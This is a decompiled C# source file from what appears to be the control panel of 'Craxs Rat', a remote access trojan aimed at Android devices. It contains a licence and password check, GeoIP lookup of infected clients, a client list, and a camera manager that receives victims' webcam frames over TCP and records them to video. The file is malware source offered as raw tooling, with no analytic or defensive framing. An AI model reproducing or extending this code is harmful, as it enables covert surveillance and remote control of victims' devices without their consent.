using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Craxs_Rat.My;
using GeoIPCitys;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x02000103 RID: 259
	public sealed class GClass9
	{
		// Token: 0x060012CB RID: 4811 RVA: 0x000C2488 File Offset: 0x000C0688
		static GClass9()
		{
			GClass9.smethod_0();
		}

		// Token: 0x060012CC RID: 4812 RVA: 0x000C257C File Offset: 0x000C077C
		public static void smethod_0()
		{
			string path = Environment.CurrentDirectory.ToString() + "\\res\\Config\\Pass.inf";
			GClass9.collection_1 = new Collection();
			GClass9.collection_3 = new Collection();
			GClass9.collection_2 = new Collection();
			try
			{
				IL_34:
				if (!File.Exists(path))
				{
					File.WriteAllText(path, Module2.smethod_59("X0X0X", GClass9.string_7));
				}
				string[] array = File.ReadAllLines(path);
				if (array.GetValue(0).ToString().Length < 3)
				{
					File.WriteAllText(path, Module2.smethod_59("X0X0X", GClass9.string_7));
					GClass9.string_4 = Module2.smethod_58(Module2.smethod_59("X0X0X", GClass9.string_7), GClass9.string_7);
				}
				else
				{
					GClass9.string_4 = Module2.smethod_58(array.GetValue(0).ToString(), GClass9.string_7);
				}
			}
			catch (Exception ex)
			{
				File.WriteAllText(path, Module2.smethod_59("X0X0X", GClass9.string_7));
				goto IL_34;
			}
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(Application.ExecutablePath);
			if (!versionInfo.CompanyName.ToString().ToLower().Contains(Module2.smethod_58("yigddWKaKahn6QVN6S7nCw==", "5555")))
			{
			}
			XmlDocument xmlDocument = new XmlDocument();
			try
			{
				xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
			}
			catch (Exception ex2)
			{
			}
			if (Module2.smethod_40(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project"), "AngelAndroid_FileManager"))
			{
			}
			string value2;
			if (Operators.CompareString(xmlDocument.DocumentElement.Name, Module2.smethod_58("7YJYs8nIczW6UcZhgrfrfrfrfdEyXw==", "Classrfrf"), false) == 0)
			{
				XmlElement xmlElement = xmlDocument.FirstChild["P2"];
				XmlElement xmlElement2 = xmlDocument.FirstChild["P4"];
				string value = xmlElement2.FirstChild.Value;
				if (Operators.ConditionalCompareObjectNotEqual(Module2.smethod_58(value, "Zgfgbreferfedfrg"), Module2.smethod_3(Application.ExecutablePath), false))
				{
					Interaction.MsgBox(Module2.smethod_58("6PR33ggFwNg/Cx/Ol4q0/muMb85+G7mzi2bGyBqiLj7q1G4i34Y8qqFjTWwBPKJ6sM8Wj+b0GnBg\r\nd6DUvXOMQg==", "Camera Manager"), MsgBoxStyle.OkOnly, null);
					Module2.smethod_1();
					GClass9.cypherRat_0.Home_Btn.Enabled = false;
					GClass9.cypherRat_0.blockbtn.Enabled = false;
					GClass9.cypherRat_0.Connection_btn.Enabled = false;
					GClass9.cypherRat_0.Build_btn.Enabled = false;
					GClass9.cypherRat_0.inject_btn.Enabled = false;
					GClass9.cypherRat_0.Settings_btn.Enabled = false;
					GClass9.string_4 = "a";
					GClass9.string_1 = "v";
					GClass9.cypherRat_0 = new CypherRat();
					GClass9.cypherRat_0.WindowState = FormWindowState.Minimized;
				}
				value2 = xmlElement.FirstChild.Value;
			}
			if (Operators.CompareString(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), Module2.smethod_58(value2, "​‍‌‎‏"), false) != 0)
			{
			}
			Module13.smethod_0();
			GClass9.gclass4_0 = new GClass4(Module8.string_1 + "\\GeoIP\\GeoIP.dat");
			GClass9.infoClass_0 = new InfoClass(Module8.string_1 + "\\GeoIP\\GeoIPCity.dat");
			GClass9.string_0 = GClass9.string_4;
			GClass9.string_1 = "x0D0x";
			GClass9.string_2 = "x0L0x";
			GClass9.string_3 = "x0A0x";
			bool flag = false;
			string[] files = Directory.GetFiles(Module8.string_1 + "\\GeoIP\\Flags");
			foreach (string text in files)
			{
				if (!flag)
				{
					if (Operators.CompareString(Module5.Flags_Size, "32px", false) == 0)
					{
						GClass9.imageList_0.ImageSize = new Size(32, 32);
					}
					else if (Operators.CompareString(Module5.Flags_Size, "24px", false) == 0)
					{
						GClass9.imageList_0.ImageSize = new Size(24, 24);
					}
					else
					{
						GClass9.imageList_0.ImageSize = new Size(16, 16);
					}
					GClass9.imageList_0.ColorDepth = ColorDepth.Depth32Bit;
					flag = true;
				}
				string path2 = text;
				string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(path2);
				GClass9.imageList_0.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text));
			}
		}

		// Token: 0x060012CD RID: 4813 RVA: 0x000C29D4 File Offset: 0x000C0BD4
		public static string smethod_1(string string_9)
		{
			string text = Module8.string_1 + "\\" + Module8.Users;
			string text2 = text + "\\" + string_9;
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			return text2;
		}

		// Token: 0x060012CE RID: 4814 RVA: 0x000C2A2C File Offset: 0x000C0C2C
		public static void smethod_2(GClass8 gclass8_1, object object_26, object object_27)
		{
			try
			{
				if (object_27 == null)
				{
					object_27 = (Bitmap)Module2.smethod_29();
				}
				if (gclass8_1 != null)
				{
					if (Operators.CompareString(MySettingsProperty.Settings.LOG, "Yes", false) == 0)
					{
						string text = gclass8_1.string_1;
						GClass9.cypherRat_0.method_22(new object[]
						{
							object_27,
							text,
							GModule0.smethod_0(text),
							object_26
						});
					}
				}
				else
				{
					GClass9.cypherRat_0.method_22(new object[]
					{
						object_27,
						object_26,
						" ",
						"Blocked",
						" "
					});
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060012CF RID: 4815 RVA: 0x000C2AEC File Offset: 0x000C0CEC
		public static void smethod_3(object object_0)
		{
			GClass9.Class32 @class = new GClass9.Class32();
			@class.object_0 = object_0;
			@class.int_0 = -1;
			@class.asyncVoidMethodBuilder_0 = AsyncVoidMethodBuilder.Create();
			@class.asyncVoidMethodBuilder_0.Start<GClass9.Class32>(ref @class);
		}

		// Token: 0x060012D0 RID: 4816 RVA: 0x000C2B28 File Offset: 0x000C0D28
		private static void smethod_4(string string_9, string string_10, Image image_0)
		{
			try
			{
				if (!Directory.Exists(string_9 + "\\" + string_10.Replace(".mp4", "")))
				{
					Directory.CreateDirectory(string_9 + "\\" + string_10.Replace(".mp4", ""));
				}
				image_0.Save(string.Concat(new string[]
				{
					string_9,
					"\\",
					string_10.Replace(".mp4", ""),
					"\\",
					string_10.Replace(".mp4", Conversions.ToString(DateTime.Now.Millisecond) + ".jpg")
				}));
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060012D1 RID: 4817 RVA: 0x000C2C00 File Offset: 0x000C0E00
		private static void smethod_5(GClass8 gclass8_0, string string_9, Array array_0, TcpClient tcpClient_0)
		{
			try
			{
				if (!gclass8_0.bool_2)
				{
					string[] array = string_9.Split(new string[]
					{
						GClass9.string_3
					}, StringSplitOptions.None);
					object[] array2 = GClass9.smethod_14(array[1]);
					string name = "Camera_Manager_" + ((GClass8)array2[0]).string_2;
					CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
					if (cameraManager != null)
					{
						if (!cameraManager.bool_3)
						{
							cameraManager.bool_3 = true;
							cameraManager.string_2 = cameraManager.gclass8_2.string_10;
							cameraManager.Button3.Enabled = true;
							cameraManager.gclass8_0 = gclass8_0;
							cameraManager.statustext.Text = "Connected - " + cameraManager.string_3;
						}
						cameraManager.tcpClient_0 = tcpClient_0;
						byte[] array3 = (byte[])array_0.GetValue(1);
						using (MemoryStream memoryStream = new MemoryStream(array3))
						{
							using (Bitmap bitmap = (Bitmap)Image.FromStream(memoryStream))
							{
								Bitmap image = new Bitmap(bitmap);
								cameraManager.CAM0.Image = cameraManager.method_8(image);
								CameraManager cameraManager2 = cameraManager;
								ref int ptr = ref cameraManager2.int_1;
								cameraManager2.int_1 = checked(ptr + 1);
								cameraManager.string_1 = Module8.smethod_18((long)array3.Length);
								if (cameraManager.bool_1)
								{
									int width = Module2.smethod_0(cameraManager.CAM0.Width, 2);
									int height = Module2.smethod_0(cameraManager.CAM0.Height, 2);
									Bitmap bitmap2 = new Bitmap(width, height, PixelFormat.Format32bppArgb);
									using (Graphics graphics = Graphics.FromImage(bitmap2))
									{
										graphics.DrawImage(image, new Rectangle(0, 0, bitmap2.Width, bitmap2.Height));
									}
									cameraManager.videoFileWriter_0.WriteVideoFrame(bitmap2);
								}
							}
						}
					}
					else
					{
						gclass8_0.bool_0 = false;
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060012D2 RID: 4818 RVA: 0x000C2E5C File Offset: 0x000C105C
		private static string smethod_6(string string_9)
		{
			string result;
			if (!string_9.ToLower().Contains(Module13.string_12.ToLower()))
			{
				result = "null";
			}
			else
			{
				result = string_9;
			}
			return result;
		}

		// Token: 0x060012D3 RID: 4819 RVA: 0x000C2E8C File Offset: 0x000C108C
		private static string smethod_7(string string_9)
		{
			string result;
			if (!string_9.ToLower().Contains(Module13.string_13.ToLower()))
			{
				result = "null";
			}
			else
			{
				result = string_9;
			}
			return result;
		}

		// Token: 0x060012D4 RID: 4820 RVA: 0x000C2EBC File Offset: 0x000C10BC
		private static string smethod_8(string string_9)
		{
			string result;
			if (string_9.ToLower().Contains(Module13.string_17.ToLower()))
			{
				result = string_9;
			}
			else
			{
				result = "null";
			}
			return result;
		}

		// Token: 0x060012D5 RID: 4821 RVA: 0x000C2EEC File Offset: 0x000C10EC
		private static string smethod_9(string string_9)
		{
			string result;
			if (string_9.ToLower().StartsWith("-832"))
			{
				result = string_9;
			}
			else
			{
				result = "null";
			}
			return result;
		}

		// Token: 0x060012D6 RID: 4822 RVA: 0x000C2F18 File Offset: 0x000C1118
		private static DataGridViewCell[] smethod_10(string string_0, DataGridView dataGridView_0)
		{
			GClass9.Class33 @class = new GClass9.Class33();
			@class.string_0 = string_0;
			DataGridViewCell[] result;
			try
			{
				DataGridViewCell[] array = dataGridView_0.Rows.Cast<object>().Select((GClass9.Class31.func_0 != null) ? GClass9.Class31.func_0 : (GClass9.Class31.func_0 = new Func<object, DataGridViewRow>(GClass9.Class31.class31_0.method_6))).SelectMany((GClass9.Class31.func_2 == null) ? (GClass9.Class31.func_2 = new Func<DataGridViewRow, IEnumerable<DataGridViewCell>>(GClass9.Class31.class31_0.method_7)) : GClass9.Class31.func_2, (GClass9.Class31.func_3 == null) ? (GClass9.Class31.func_3 = new Func<DataGridViewRow, DataGridViewCell, DataGridViewCell>(GClass9.Class31.class31_0.method_9)) : GClass9.Class31.func_3).Where(new Func<DataGridViewCell, bool>(@class.method_0)).ToArray<DataGridViewCell>();
				result = array;
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060012D7 RID: 4823 RVA: 0x000C2FF4 File Offset: 0x000C11F4
		public static object[] smethod_11(object object_25, GClass8 gclass8_0)
		{
			bool flag = false;
			object[] result;
			if (GClass9.cypherRat_0.IsDisposed)
			{
				result = new object[]
				{
					null,
					flag
				};
			}
			else
			{
				try
				{
					GClass9.cypherRat_0.method_28(new object[]
					{
						gclass8_0
					});
				}
				catch (Exception ex)
				{
				}
				GClass9.gclass8_0 = gclass8_0;
				if (Module5.NOTI_SOUND && File.Exists(Module7.string_0) && Module7.soundPlayer_0.IsLoadCompleted)
				{
					try
					{
						Module7.soundPlayer_0.Play();
					}
					catch (InvalidOperationException ex2)
					{
					}
				}
				result = new object[]
				{
					gclass8_0.dataGridViewRow_0,
					flag
				};
			}
			return result;
		}

		// Token: 0x060012D8 RID: 4824 RVA: 0x000C30C4 File Offset: 0x000C12C4
		public static DataGridViewRow smethod_12(string string_9)
		{
			checked
			{
				if (GClass9.cypherRat_0.ClientsWindow.Rows.Count > 0)
				{
					int num = GClass9.cypherRat_0.ClientsWindow.Rows.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						try
						{
							DataGridViewRow dataGridViewRow = GClass9.cypherRat_0.ClientsWindow.Rows[i];
							if (dataGridViewRow != null && dataGridViewRow.Cells[2].Tag != null && Operators.CompareString(dataGridViewRow.Cells[2].Tag.ToString(), string_9, false) == 0)
							{
								return GClass9.cypherRat_0.ClientsWindow.Rows[i];
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				return null;
			}
		}

		// Token: 0x060012D9 RID: 4825 RVA: 0x000C31B0 File Offset: 0x000C13B0
		public static object smethod_13(string string_9)
		{
			checked
			{
				if (GClass9.cypherRat_0.ClientsWindow.Rows.Count > 0)
				{
					int num = GClass9.cypherRat_0.ClientsWindow.Rows.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						try
						{
							DataGridViewRow dataGridViewRow = GClass9.cypherRat_0.ClientsWindow.Rows[i];
							if (dataGridViewRow != null && dataGridViewRow.Cells[2].Tag != null && Operators.CompareString(dataGridViewRow.Cells[2].Tag.ToString(), string_9, false) == 0)
							{
								return true;
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				return false;
			}
		}

		// Token: 0x060012DA RID: 4826 RVA: 0x000C328C File Offset: 0x000C148C
		public static object[] smethod_14(string string_9)
		{
			Collection obj = GClass9.collection_2;
			object[] result;
			lock (obj)
			{
				try
				{
					result = (object[])GClass9.collection_2[string_9];
				}
				catch (Exception ex)
				{
					result = new object[2];
				}
			}
			return result;
		}

		// Token: 0x060012DB RID: 4827 RVA: 0x000C32FC File Offset: 0x000C14FC
		public static Image smethod_15(Image image_0)
		{
			return image_0;
		}

		// Token: 0x04000AAC RID: 2732
		public static object object_0 = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000AAD RID: 2733
		public static object object_1 = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000AAE RID: 2734
		public static bool bool_0 = false;

		// Token: 0x04000AAF RID: 2735
		public static Collection collection_0 = new Collection();

		// Token: 0x04000AB0 RID: 2736
		public static object object_2 = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000AB1 RID: 2737
		public static object object_3 = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000AB2 RID: 2738
		public static object ObjectValue = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000AB3 RID: 2739
		public static object object_4 = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000AB4 RID: 2740
		public static object object_5 = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000AB5 RID: 2741
		public static string string_0;

		// Token: 0x04000AB6 RID: 2742
		public static string string_1;

		// Token: 0x04000AB7 RID: 2743
		public static string string_2;

		// Token: 0x04000AB8 RID: 2744
		public static string string_3;

		// Token: 0x04000AB9 RID: 2745
		public static CypherRat cypherRat_0;

		// Token: 0x04000ABA RID: 2746
		public static GClass8 gclass8_0 = null;

		// Token: 0x04000ABB RID: 2747
		public static GClass4 gclass4_0;

		// Token: 0x04000ABC RID: 2748
		public static string string_4 = "";

		// Token: 0x04000ABD RID: 2749
		public static ImageList imageList_0 = new ImageList();

		// Token: 0x04000ABE RID: 2750
		public static string string_5 = Module8.string_1 + "\\Thumbs";

		// Token: 0x04000ABF RID: 2751
		private static Collection collection_1 = new Collection();

		// Token: 0x04000AC0 RID: 2752
		public static Collection collection_2 = new Collection();

		// Token: 0x04000AC1 RID: 2753
		public static string string_6;

		// Token: 0x04000AC2 RID: 2754
		public static InfoClass infoClass_0 = new InfoClass();

		// Token: 0x04000AC3 RID: 2755
		public static bool bool_1 = false;

		// Token: 0x04000AC4 RID: 2756
		public static Collection collection_3;

		// Token: 0x04000AC5 RID: 2757
		public static string string_7 = "Nagato";

		// Token: 0x04000AC6 RID: 2758
		public static string string_8 = "BSN12345678901234567";

		// Token: 0x02000104 RID: 260
		// (Invoke) Token: 0x060012DF RID: 4831
		public delegate void GDelegate30(object object_0);

		// Token: 0x02000105 RID: 261
		[CompilerGenerated]
		[Serializable]
		internal sealed class Class31
		{
			// Token: 0x060012E2 RID: 4834 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_0(object _object_0)
			{
				Module8.smethod_13((Array)_object_0);
			}

			// Token: 0x060012E3 RID: 4835 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_1(object _object_1)
			{
				Module8.smethod_13((Array)_object_1);
			}

			// Token: 0x060012E4 RID: 4836 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_2(object _object_2)
			{
				Module8.smethod_13((Array)_object_2);
			}

			// Token: 0x060012E5 RID: 4837 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_3(object _object_3)
			{
				Module8.smethod_13((Array)_object_3);
			}

			// Token: 0x060012E6 RID: 4838 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_4(object _object_4)
			{
				Module8.smethod_13((Array)_object_4);
			}

			// Token: 0x060012E7 RID: 4839 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_5(object _object_5)
			{
				Module8.smethod_13((Array)_object_5);
			}

			// Token: 0x060012E8 RID: 4840 RVA: 0x00007524 File Offset: 0x00005724
			internal DataGridViewRow method_6(object _object_6)
			{
				return (DataGridViewRow)_object_6;
			}

			// Token: 0x060012E9 RID: 4841 RVA: 0x0000752C File Offset: 0x0000572C
			internal IEnumerable<DataGridViewCell> method_7(DataGridViewRow _dataGridViewRow_0)
			{
				return _dataGridViewRow_0.Cells.Cast<object>().Select((GClass9.Class31.func_1 == null) ? (GClass9.Class31.func_1 = new Func<object, DataGridViewCell>(GClass9.Class31.class31_0.method_8)) : GClass9.Class31.func_1);
			}

			// Token: 0x060012EA RID: 4842 RVA: 0x00007562 File Offset: 0x00005762
			internal DataGridViewCell method_8(object _object_7)
			{
				return (DataGridViewCell)_object_7;
			}

			// Token: 0x060012EB RID: 4843 RVA: 0x0000756A File Offset: 0x0000576A
			internal DataGridViewCell method_9(DataGridViewRow _dataGridViewRow_1, DataGridViewCell _dataGridViewCell_0)
			{
				return _dataGridViewCell_0;
			}

			// Token: 0x04000AC7 RID: 2759
			public static readonly GClass9.Class31 class31_0 = new GClass9.Class31();

			// Token: 0x04000AC8 RID: 2760
			public static WaitCallback waitCallback_0;

			// Token: 0x04000AC9 RID: 2761
			public static WaitCallback waitCallback_1;

			// Token: 0x04000ACA RID: 2762
			public static WaitCallback waitCallback_2;

			// Token: 0x04000ACB RID: 2763
			public static WaitCallback waitCallback_3;

			// Token: 0x04000ACC RID: 2764
			public static WaitCallback waitCallback_4;

			// Token: 0x04000ACD RID: 2765
			public static WaitCallback waitCallback_5;

			// Token: 0x04000ACE RID: 2766
			public static Func<object, DataGridViewRow> func_0;

			// Token: 0x04000ACF RID: 2767
			public static Func<object, DataGridViewCell> func_1;

			// Token: 0x04000AD0 RID: 2768
			public static Func<DataGridViewRow, IEnumerable<DataGridViewCell>> func_2;

			// Token: 0x04000AD1 RID: 2769
			public static Func<DataGridViewRow, DataGridViewCell, DataGridViewCell> func_3;
		}

		// Token: 0x02000107 RID: 263
		[CompilerGenerated]
		internal sealed class Class33
		{
			// Token: 0x060012F0 RID: 4848 RVA: 0x0000756D File Offset: 0x0000576D
			internal bool method_0(DataGridViewCell _dataGridViewCell_1)
			{
				return Operators.ConditionalCompareObjectEqual(_dataGridViewCell_1.Tag, this.string_0, false);
			}

			// Token: 0x04000CBC RID: 3260
			public string string_0;
		}
	}
}
